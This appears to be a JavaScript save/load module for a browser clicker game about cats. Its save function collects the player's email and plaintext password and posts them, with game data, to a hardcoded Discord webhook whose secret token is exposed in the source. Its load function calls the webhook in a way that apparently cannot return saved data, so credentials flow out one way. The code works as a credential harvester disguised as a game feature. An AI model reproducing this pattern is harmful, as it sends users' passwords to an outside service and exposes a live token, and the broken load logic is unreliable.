// DOM Elements
const emailInput = document.getElementById('email-input');
const passwordInput = document.getElementById('password-input');
const saveBtn = document.getElementById('save-btn');
const loadBtn = document.getElementById('load-btn');

// Game State Variables (exposed for account management)
let cp = 0, cpPerClick = 1, cpPerSecond = 0, resets = 0, legacyMultiplier = 1, breeds = ['Tabby'];
let clickUpgrades = [];
let helpers = [];
let specials = [];

// Discord Webhook URL
const WEBHOOK_URL = 'https://discord.com/api/webhooks/1347623621870223390/MnshZJcOQ7UZ03aDFq8OrA1VfbmcXYK-dp8WhZqRborySSHnIbtZ1bzKgC4haBFKewED';

// Function to format large numbers with prefixes
function formatCP(num) {
    const prefixes = [
        { name: '', value: 1 },
        { name: 'K', value: 1e3 },
        { name: 'M', value: 1e6 },
        { name: 'B', value: 1e9 },
        { name: 'T', value: 1e12 },
        { name: 'Qa', value: 1e15 },
        { name: 'Qi', value: 1e18 },
        { name: 'Sx', value: 1e21 },
        { name: 'Sp', value: 1e24 },
        { name: 'Oc', value: 1e27 },
        { name: 'No', value: 1e30 },
        { name: 'Dc', value: 1e33 },
        { name: 'Ud', value: 1e36 },
        { name: 'Dd', value: 1e39 },
        { name: 'Td', value: 1e42 },
        { name: 'Qad', value: 1e45 },
        { name: 'Qid', value: 1e48 },
        { name: 'Sxd', value: 1e51 },
        { name: 'Spd', value: 1e54 },
        { name: 'Ocd', value: 1e57 },
        { name: 'Nod', value: 1e60 },
        { name: 'Vg', value: 1e63 },
        { name: 'Uvg', value: 1e66 },
        { name: 'Dvg', value: 1e69 },
        { name: 'Tvg', value: 1e72 },
        { name: 'Qavg', value: 1e75 },
        { name: 'Qivg', value: 1e78 },
        { name: 'Sxvg', value: 1e81 },
        { name: 'Spvg', value: 1e84 },
        { name: 'Ocvg', value: 1e87 },
        { name: 'Novg', value: 1e90 },
        { name: 'Tng', value: 1e93 },
        { name: 'Qatng', value: 1e96 },
        { name: 'Qitng', value: 1e99 },
        { name: 'Sxtng', value: 1e102 },
        { name: 'Sptng', value: 1e105 },
        { name: 'Octng', value: 1e108 },
        { name: 'Notng', value: 1e111 },
        { name: 'Cent', value: 1e114 },
        { name: 'Decent', value: 1e117 },
        { name: 'Novdec', value: 1e120 }
    ];
    for (let i = prefixes.length - 1; i >= 0; i--) {
        if (num >= prefixes[i].value) {
            return (num / prefixes[i].value).toFixed(1) + prefixes[i].name;
        }
    }
    return num.toFixed(0);
}

// Enhanced email validation function
function isValidEmail(email) {
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    const hasAtSymbol = email.includes('@');
    return emailRegex.test(email) && hasAtSymbol;
}

// Function to save game progress to Discord webhook
async function saveProgress() {
    const email = emailInput.value.trim();
    const password = passwordInput.value.trim();
    if (!email || !password) {
        alert('Please enter both email and password!');
        return;
    }
    if (!isValidEmail(email)) {
        alert('Please enter a valid email address with an @ symbol!');
        return;
    }
    const saveData = {
        email,
        password,
        cp,
        cpPerClick,
        cpPerSecond,
        resets,
        legacyMultiplier,
        clickUpgrades,
        helpers,
        specials,
        breeds,
        timestamp: new Date().toISOString()
    };
    const embed = {
        title: `Save Data for ${email}`,
        description: `\`\`\`json\n${JSON.stringify(saveData, null, 2).substring(0, 4000)}\n\`\`\``,
        color: 0xFF69B4
    };
    const payload = JSON.stringify({ embeds: [embed] });
    console.log(`Payload size: ${payload.length} characters`);

    let attempts = 0;
    const maxAttempts = 3;
    while (attempts < maxAttempts) {
        try {
            const response = await fetch(WEBHOOK_URL, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'User-Agent': 'Mozilla/5.0 (compatible; CatClickerBot/1.0)'
                },
                body: payload
            });
            if (response.ok) {
                alert('Progress saved successfully!');
                return;
            } else if (response.status === 429) {
                const retryAfter = response.headers.get('Retry-After') || 5;
                console.warn(`Rate limited. Retrying after ${retryAfter} seconds...`);
                await new Promise(resolve => setTimeout(resolve, retryAfter * 1000));
                attempts++;
            } else {
                const errorText = await response.text();
                console.error(`Failed to save progress. Status: ${response.status}, Response: ${errorText}`);
                alert('Failed to save progress. Check Discord webhook.');
                return;
            }
        } catch (error) {
            console.error('Error saving progress:', error);
            alert('Error saving progress. Check console for details.');
            return;
        }
    }
    alert('Failed to save progress after multiple attempts due to rate limiting.');
}

// Function to load game progress from Discord webhook
async function loadProgress() {
    const email = emailInput.value.trim();
    const password = passwordInput.value.trim();
    if (!email || !password) {
        alert('Please enter both email and password!');
        return;
    }
    if (!isValidEmail(email)) {
        alert('Please enter a valid email address with an @ symbol!');
        return;
    }
    try {
        const response = await fetch(WEBHOOK_URL, { method: 'GET' });
        const messages = await response.json();
        const userSave = messages.find(msg => {
            const contentMatch = msg.content && msg.content.includes(email);
            const embedMatch = msg.embeds && msg.embeds.some(embed => embed.title && embed.title.includes(email));
            return contentMatch || embedMatch;
        });
        if (userSave) {
            let data;
            if (userSave.content) {
                data = JSON.parse(userSave.content.match(/```json\n([\s\S]*?)\n```/)[1]);
            } else if (userSave.embeds && userSave.embeds[0]) {
                data = JSON.parse(userSave.embeds[0].description.match(/```json\n([\s\S]*?)\n```/)[1]);
            }
            if (data.email === email && data.password === password) {
                cp = data.cp;
                cpPerClick = data.cpPerClick;
                cpPerSecond = data.cpPerSecond;
                resets = data.resets;
                legacyMultiplier = data.legacyMultiplier;
                clickUpgrades = data.clickUpgrades;
                helpers = data.helpers;
                specials = data.specials;
                breeds = data.breeds;
                // Trigger UI update (assumed to be handled by the main script)
                if (typeof updateDisplay === 'function') updateDisplay();
                alert('Progress loaded successfully!');
            } else {
                alert('Email or password incorrect.');
            }
        } else {
            alert('No save data found for this email.');
        }
    } catch (error) {
        console.error('Error loading progress:', error);
        alert('Error loading progress. Webhook may not support GET or data is unavailable.');
    }
}

// Expose functions to the global scope for event listeners in index.html
window.saveProgress = saveProgress;
window.loadProgress = loadProgress;

// Initialize by fetching game state variables from the main script (if already defined)
if (typeof window.cp !== 'undefined') {
    cp = window.cp;
    cpPerClick = window.cpPerClick;
    cpPerSecond = window.cpPerSecond;
    resets = window.resets;
    legacyMultiplier = window.legacyMultiplier;
    breeds = window.breeds;
    clickUpgrades = window.clickUpgrades;
    helpers = window.helpers;
    specials = window.specials;
}
